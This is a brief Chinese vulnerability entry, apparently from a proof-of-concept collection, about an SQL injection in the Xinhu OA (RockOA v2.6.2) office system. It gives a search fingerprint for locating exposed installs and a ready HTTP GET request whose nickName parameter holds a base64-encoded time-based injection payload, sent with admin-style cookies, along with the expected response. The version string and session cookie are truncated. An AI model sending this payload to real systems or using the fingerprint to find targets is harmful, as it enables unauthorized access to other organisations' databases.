# 信呼OA系统RockOAv2.6.2存在SQL注入漏洞

- **系统**：信呼OA系统RockOAv2.6.　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="信呼-OA系统"`
- **请求**：`GET /index.php?m=openmodhetongopenapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDUpIw== HTTP/1.1`
- **关键头**：`Cookie: loginname=admin; jueseid=1; danweiid=1; quanxian=0; PHPSESSID=cv1c2tefjckfjnpin3…`　`Host: 127.0.0.1`　`sec-fetch-user: ?1`
- **预期**：200　|　—